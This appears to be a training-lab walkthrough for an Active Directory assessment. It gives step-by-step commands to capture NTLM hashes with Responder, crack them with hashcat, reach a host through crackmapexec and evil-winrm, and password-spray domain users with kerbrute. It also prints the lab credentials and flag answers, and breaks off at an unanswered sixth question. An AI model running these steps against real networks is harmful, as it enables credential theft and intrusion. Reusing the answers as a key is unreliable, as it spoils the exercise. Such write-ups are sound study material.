## Q1. Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name? 

I had no clue how to do this, so I checked my notes and then refered the notes that I took from the topic: **Sniffing out the foothold**

They used responder in order to capture hsah..

Lets fire up our responder (make sure you are using sudo):
```
sudo responder -I ens224
```

Then you will see the output something like:
<img width="1065" height="198" alt="image" src="https://github.com/user-attachments/assets/4cc62209-10bf-4239-a1e3-c2d342fb1111" />

There's our answer: **AB920**

## Q2.  What is this user's cleartext password? 

For this navigate to `/usr/share/responder/logs` and look for a file name in this format: (MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt<img width="1566" height="99" alt="image" src="https://github.com/user-attachments/assets/1dd74bee-13fa-46c7-9b3e-8b5881d0d13a" />

Cat the file and copy paste the output to a new file then use hashcat to crack it:

```
hashcat -m 5600 <file> /usr/share/wordlists/rockyou.txt
```

Answer: **weasal**

## Q3. Submit the contents of the C:\flag.txt file on MS01. 

Enumeration regarding the network:

I enumerated the domain before using the following process:
1. Checked the ip route where I got the N/W range which is: 172.16.6.0/23
2. Then I used `crackmapexec smb 172.16.6.0/23`, from where I found the IP's of the machines: 
<img width="1579" height="114" alt="image" src="https://github.com/user-attachments/assets/afa062ad-bead-4aca-9fbe-e4b77c98bb01" />

Now lets start with our target i.e **MS01 - 172.16.6.50**

Check if we can connect to it using winrm:
```
crackmapexec winrm 172.16.7.50 -u 'AB920' -p 'weasal'
```
<img width="1347" height="142" alt="image" src="https://github.com/user-attachments/assets/58dd23d8-9783-4e8f-a66e-d7f5e2ef0d82" />

As we can see its been Pwned,

Lets connect to it using evil-winrm:
```
evil-winrm -i 172.16.7.50 -u 'AB920' -p 'weasal'
```

Then navigate to C:\, and `type flag.txt`

Answer: aud1t_gr0up_m3mbersh1ps!

## Q4/5. Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain. 

Enumerate users from DC (SMB) and save the output:
```
crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | tee unames.txt
```

Then clear the output:
```
cat usernames.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee cleanuser.txt
```

Then we need to create a password combination list with the username, for this i used the following wordlist: 2023-200_most_used_passwords.txt

Then creating combos:
```
awk 'NR==FNR{p[++np]=$0; next}{for(i=1;i<=np;i++) print $0 ":" p[i]}' 2023-200_most_used_passwords.txt cleanusers.txt > combos.txt
```

Using kerbrute to brute force the passwords:
```
cat combos.txt | kerbrute bruteforce -d inlanefreight.local --dc 172.16.7.3 -
```

After finding the combo validate it against the SMB share:
```
smbclient //172.16.7.3/'Department Shares' -U 'INLANEFREIGHT\\BR086'%'Welcome1'
```

Q4 Answer: BR086
Q5 Answer: Welcome1

## Q6. Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file? 


